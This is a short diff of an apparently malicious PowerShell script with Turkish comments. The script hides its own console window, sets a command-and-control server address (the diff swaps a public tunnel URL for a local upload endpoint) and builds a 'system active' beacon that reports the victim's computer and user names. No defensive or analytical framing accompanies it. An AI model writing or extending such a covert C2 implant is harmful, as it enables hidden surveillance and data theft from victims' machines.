@@ -6,7 +6,7 @@ public static extern bool ShowWindow(int hWnd, int nCmdShow);
 $window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
 
 # C2 Sunucu Adresin
-$C2_SERVER = "http://pcdjj-46-106-148-63.a.free.pinggy.link"
+$C2_SERVER = "192.168.1.10:8080/upload"
 
 # İlk Sinyal
 $startup_msg = "[+] SİSTEM AKTİF! Bilgisayar: $env:COMPUTERNAME | Kullanıcı: $env:USERNAME"
